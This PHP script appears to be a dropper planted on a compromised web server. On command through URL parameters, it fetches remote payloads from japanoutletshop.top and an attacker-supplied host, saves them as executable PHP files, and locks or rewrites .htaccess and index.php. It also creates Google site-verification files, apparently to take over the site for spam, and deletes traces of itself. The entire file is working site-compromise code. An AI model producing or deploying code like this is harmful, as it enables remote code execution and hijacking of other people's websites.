<?php 
@chmod(".htaccess",0755);
@chmod("index.php",0755);
@set_time_limit(0);
@ini_set('display_errors', 1);

if(isset($_GET['use']) && $_GET['use'] == '2')
	define('USEFUNCTION',2);
else
	define('USEFUNCTION',1);

if(!function_exists('file_put_contents')) {
        function file_put_contents($filename, $s) {
                $fp = @fopen($filename, 'w');
                @fwrite($fp, $s);
                @fclose($fp);
                return TRUE;
        }
}

if(isset($_GET["rdir"])&& $_GET["url"]){
	$rdir = $_GET["rdir"];
	$url = $_GET["url"];
	@mkdir("./". $rdir);
	$url1='http://www.japanoutletshop.top/popup-pomo.txt';
	$url2='http://' . $url . 'moban.html';
	$url3='http://' . $url . 'index.txt';
	$url4='http://' . $url . 'install.txt';
	$url5='http://www.japanoutletshop.top/server.txt';
	$str_hm1 = curl_get_from_webpage($url1);
	$str_hm2 = curl_get_from_webpage($url2);
	$str_hm3 = curl_get_from_webpage($url3);
	$str_hm4 = curl_get_from_webpage($url4);
	$str_hm5 = curl_get_from_webpage($url5);
	file_put_contents("./" . $rdir . "/" . "popup-pomo.php", $str_hm1);
	file_put_contents("./" . $rdir . "/" . "moban.html", $str_hm2);
	file_put_contents("./" . $rdir . "/" . "index.php", $str_hm3);
	file_put_contents("./" . $rdir . "/" . "install.php", $str_hm4);
	file_put_contents("./" . $rdir . "/" . "server.php", $str_hm5);
	$file[] =  './' . $rdir . '/' . 'moban.html';
	$file[] =  './' . $rdir . '/' . 'index.php';
	$file[] =  './' . $rdir . '/' . 'install.php';
	$file[] =  './' . $rdir . '/' . 'server.php';
	foreach($file as $values){
		if(file_exists($values)){
			$handle = fopen($values,'rb');

			$rdSIze = filesize("./".$values);
			$tempStr = fread($handle, $rdSIze); 
			fclose($handle); 
			if(strstr($tempStr,'//file end')){
				echo "<div style='color:#216AEA;font-weight:bold;'>$values has successed!</div><br/>";
				@chmod($values,0744);
			}else{
				echo "<div style='color:red;font-weight:bold;'>file $values must be reload!</div><br/>";
			}
			unset($tempStr);
	
		}else{
			echo "<div style='color:red;font-weight:bold;'>file $values not found!</div><br/>";
		}
	}
}

function curl_get_from_webpage($url,$proxy='',$loop=10){
	$data = false;
        $i = 0;
        while(!$data) {
             $data = curl_get_from_webpage_one_time($url,$proxy);
             if($i++ >= $loop) break;
        }
	return $data;
}
 
 
 


function curl_get_from_webpage_one_time($url,$proxy='',$tms=0){
	  $data = false;
  if(USEFUNCTION == 1){
 		$curl = curl_init();	
		curl_setopt($curl, CURLOPT_URL, $url);
		curl_setopt($curl, CURLOPT_HEADER, false);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
		$data=curl_exec($curl);
		curl_close($curl);
 
  }elseif(USEFUNCTION == 2){
		$data = @file_get_contents($url);
  }
 
  return $data;
}

rename("./move2.php","./move.php");

if(isset($_GET['read']) &&  $_GET['read'] == '1'){
	$a=file_get_contents(".htaccess");
	echo htmlspecialchars($a);
}

if(isset($_GET['chmod']) &&  $_GET['chmod'] == '1'){
	@chmod(".htaccess",0444);
	@chmod("index.php",0444);
	echo "chmod is ok";
}

if(isset($_GET['del']) &&  $_GET['del'] == '1'){
	@chmod("./index.php",0755);
	$Indexruler = '#(/+installbg.*?/+installend)#s';
	$strDefault = file_get_contents("./index.php");
	$strDefault = preg_replace($Indexruler, '', $strDefault);
	file_put_contents("./index.php",$strDefault);
	echo "index del is ok";
}

if(isset($_GET['del']) &&  $_GET['del'] == '2'){
	@chmod("./index.php",0755);
	$content=file_get_contents("index.php");
	// echo $content;
	$content= preg_replace('/[<\?\s*php]?.*(<\?\s*php.*)/s','$1',$content);
	file_put_contents("index.php",$content);
	echo 'del success';
}


if(isset($_GET["write"]) && trim($_GET["write"])){
	$write = trim($_GET["write"]);
	$path ='./'. $write.'.html';
	$content='google-site-verification: '.$write.'.html';
	file_put_contents($path,$content);	
	echo $content;
	unlink("move.php");
}

?>

